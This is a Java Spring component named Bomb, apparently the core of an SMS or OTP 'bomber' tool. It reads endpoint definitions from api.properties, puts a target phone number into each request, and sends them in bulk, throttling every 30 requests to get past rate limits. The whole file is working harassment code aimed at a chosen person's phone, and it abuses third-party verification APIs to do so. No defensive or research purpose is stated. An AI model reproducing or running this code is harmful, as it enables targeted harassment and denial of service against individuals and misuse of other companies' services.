package com.bomber.outer;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.URI;
import java.time.Duration;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.io.ClassPathResource;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;

@Component
public class Bomb {

	private final RestTemplate restTemplate;

	@Autowired
	public Bomb(RestTemplate restTemplate) {
		super();
		this.restTemplate = restTemplate;
	}

	
	public void bomb(String number) {
		readFile(number);
	}

	private void readFile(String number) {
		int i = 0;
		try (BufferedReader br = new BufferedReader(
				new FileReader(new ClassPathResource("api.properties").getFile()))) {
			String str;
			while ((str = br.readLine()) != null) {
				try {
					i++;
					if(i%30 == 0) {
						Thread.sleep(Duration.ofSeconds(20).toMillis());
					}
					Tokenize(str, number);
				} catch (Exception e) {

				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void Tokenize(String input, String number) {
		String array[] = input.split("\\|");
		int i = -1;
		String method = array[array.length - 3];

		HttpHeaders headers = new HttpHeaders();
		String[] innerStr = null;
		while (++i < array.length - 3) {
			innerStr = array[i].split(":");
			headers.set(innerStr[0].trim(), innerStr[1].trim());
		}

		if (method.equals("get")) {
			String url = (array[array.length - 2]).replace("inputPhoneNumber", number);
			send(headers, url);
		} else {
			String url = array[array.length - 2];
			String payload = (array[array.length - 1]).replace("inputPhoneNumber", number);
			send(payload, headers, url);
		}

	}

	private void send(HttpHeaders headers, String url) {
		HttpEntity<String> entity = new HttpEntity<>(null, headers);
		try {
			restTemplate.exchange(new URI(url), HttpMethod.GET, entity, String.class);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	private void send(String payload, HttpHeaders httpHeaders, String url) {
		HttpEntity<String> entity = new HttpEntity<String>(payload, httpHeaders);
		try {
			restTemplate.postForObject(url, entity, String.class);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
